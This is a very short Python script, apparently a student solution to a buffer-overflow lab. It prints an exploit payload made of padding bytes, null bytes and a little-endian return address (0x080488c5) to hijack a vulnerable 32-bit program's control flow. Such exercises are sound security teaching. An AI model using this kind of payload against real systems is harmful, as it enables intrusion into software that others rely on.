#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"123412341234\0\0\0\0\xc5\x88\x04\x08")
